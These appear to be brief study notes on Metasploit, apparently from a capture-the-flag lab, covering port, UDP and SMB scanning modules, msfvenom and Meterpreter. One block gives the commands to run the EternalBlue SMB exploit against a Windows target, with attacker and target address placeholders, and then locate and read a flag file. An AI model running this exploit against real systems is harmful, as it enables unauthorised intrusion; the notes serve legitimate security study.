# port scanning
```bash
$ search portscan
$ auxiliary/scanner/portscan/tcp
$ show options
```
nmap scans from msfconsole are faster

# UDP service identification
``scanner/discovery/udp_sweep`` module quickly identify services running over the UDP
this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

# SMB scans
`smb_enumshares` and `smb_version` and others allow us to scan specific services.

# metasploit database
# vulnerability scanning
just search vnc, and use whichever

```shell-session
msfconsole
exploit/windows/smb/ms17_010_eternalblue/
show payloads
set payload 2
set LHOST [tun0_ip]
set RHOSTS [target_ip]
exploit

cd ..
cd ..
dir "\*flag.txt*" /s
then 
cd \Users\Jon\Documents
type flag.txt
```

# MSFVENOM
Msfvenom is used to generate payloads.
````shell-session
msfvenom -l payloads 
````
Access payload



# METERPRETER
Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture.
Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.


```bash
msfvenom --list payloads | grep meterpreter
```
